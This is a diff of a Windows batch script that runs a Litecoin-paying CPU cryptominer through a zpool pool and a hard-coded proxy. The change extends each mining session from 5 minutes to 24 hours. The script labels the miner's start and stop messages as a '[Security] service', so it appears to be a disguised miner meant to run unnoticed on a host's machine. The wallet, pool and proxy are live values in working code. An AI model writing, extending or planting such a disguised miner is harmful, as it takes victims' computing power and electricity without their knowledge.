@@ -49,14 +49,14 @@ timeout /t 600 /nobreak
 :SECURITY_LOOP
 
 echo ----------------------------------------
-echo [Security] Service running (5 minutes)
+echo [Security] Service running (1440 minutes)
 echo ----------------------------------------
 
 start "%WINTITLE%" "%BIN%" ^
  --algorithm rinhash ^
  --pool rinhash.sea.mine.zpool.ca:7444 ^
  --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc ^
- --password c=LTC,d=0.00075 ^
+ --password c=LTC,d=0.001 ^
  --disable-gpu ^
  --nicehash false ^
  --keepalive true ^
@@ -69,8 +69,8 @@ start "%WINTITLE%" "%BIN%" ^
  --miner-priority 1 ^
  --proxy 174.138.61.184:1080
 
-REM Tunggu 5 menit
-timeout /t 300 /nobreak
+REM Tunggu 1440 menit
+timeout /t 86400 /nobreak
 
 echo [Security] Stopping service...
 taskkill /FI "WINDOWTITLE eq %WINTITLE%" /F >nul 2>&1
